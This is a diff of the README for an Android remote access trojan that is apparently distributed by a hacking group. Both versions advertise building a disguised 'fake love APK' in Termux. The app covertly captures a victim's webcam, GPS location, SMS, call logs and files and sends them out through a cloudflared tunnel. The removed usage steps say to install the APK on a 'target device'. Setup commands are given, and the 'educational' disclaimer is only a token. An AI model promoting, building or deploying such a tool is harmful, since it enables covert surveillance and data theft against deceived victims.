@@ -1,77 +1,67 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/YOUR_USERNAME/HCO-SMS-RAT/main/logo.png" width="200"/>
+  <img src="logo.png" alt="HCO-LOVE-RAT" width="250"/>
 </p>
 
-<h1 align="center">💌 HCO-SMS-RAT</h1>
+<h1 align="center">💘 HCO-LOVE-RAT</h1>
 <p align="center">
-  Remotely access SMS from an Android device through a Termux-built RAT system.<br>
-  <b>Educational Purpose Only</b> • <b>Hackers Colony Official</b>
+  A fully working Android Remote Access Tool (RAT) made for educational use.<br>
+  <strong>Generate a fake love APK</strong> with webcam, location, SMS, file access, and more — via Termux.<br><br>
+  <img src="https://img.shields.io/badge/Platform-Termux-green?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Language-Python-blue?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/Tool%20by-Hackers%20Colony-red?style=for-the-badge"/>
 </p>
 
 ---
 
-### 🔰 Features
-
-- Access victim SMS remotely
-- Termux-based payload builder
-- Flask server to collect data
-- Works on Android 10–15
-- Includes cloudflared integration
-- Auto link generation
-- Real-time logs
+### 🚀 Features
+- Auto webcam access (front/back)
+- GPS Location tracking
+- File browser + uploader
+- SMS and call log access
+- Custom payload with fake icon/name
+- Direct cloudflared tunneling
 
 ---
 
-### ⚙️ Installation in Termux
+### ⚙️ Setup in Termux
 
 ```bash
-pkg update && pkg upgrade -y
-pkg install python git curl -y
+pkg update -y && pkg upgrade -y
+pkg install python git -y
 pip install flask requests
-git clone https://github.com/Hackerscolonyofficial/HCO-SMS-RAT.git
-cd HCO-SMS-RAT
+pkg install cloudflared -y
+git clone https://github.com/<your-username>/HCO-LOVE-RAT
+cd HCO-LOVE-RAT
 bash start.sh
 ```
 
-> 🚨 This tool is for **educational** and **awareness** purposes only.
+---
+
+### ⚠️ YouTube Redirect
+This tool is **not free**. You must subscribe to our channel to use it.
+
+> The tool redirects you to [Hackers Colony Tech](https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya) for 8 seconds. After that, press `Enter` to continue and generate your APK.
 
 ---
 
-### 🚀 How to Use
+### 🛡️ Disclaimer
 
-1. Run `bash start.sh`
-2. Payload APK will be generated and served
-3. Install APK on target device
-4. Wait for SMS logs to appear in Termux console
+> This tool is for **educational and research purposes only**. Misuse of this tool is not the responsibility of the developer.
 
 ---
 
-### ☁️ Optional: Cloudflare Tunneling
-
-```bash
-pkg install cloudflared -y
-cloudflared tunnel --url http://localhost:5000
-```
-
----
-
-### ❌ Disclaimer
-
-> This tool is made for **educational purposes only**. Any misuse of this tool for unauthorized access or hacking is strictly forbidden. The creator is not responsible for your actions.
+### 👨‍💻 Author
+- **Code by Azhar**
+- [Instagram](https://www.instagram.com/hackers_colony_official)
+- [Telegram](https://t.me/hackersColony)
+- [Discord](https://discord.gg/Xpq9nCGD)
+- [Facebook](https://www.facebook.com/share/1AY25it2Em/)
+- [Website](https://hackerscolonyofficial.blogspot.com/?m=1)
 
 ---
 
-### 🤝 Connect with Us
+### 🧠 Hacker Quote
 
-- 🌐 [Hackers Colony Website](https://hackerscolonyofficial.blogspot.com/?m=1)
-- 📸 [Instagram](https://www.instagram.com/hackers_colony_official)
-- 📘 [Facebook](https://www.facebook.com/share/1AY25it2Em/)
-- ✈️ [Telegram](https://t.me/hackersColony)
-- 💬 [Discord](https://discord.gg/Xpq9nCGD)
-- 📺 [YouTube](https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya)
+> **"In a world full of firewalls, be the zero-day."**
 
 ---
-
-### 👨‍💻 Code by Azhar
-
-> 💬 _“Hacking isn’t just about code. It’s about mindset.”_ — Hackers Colony
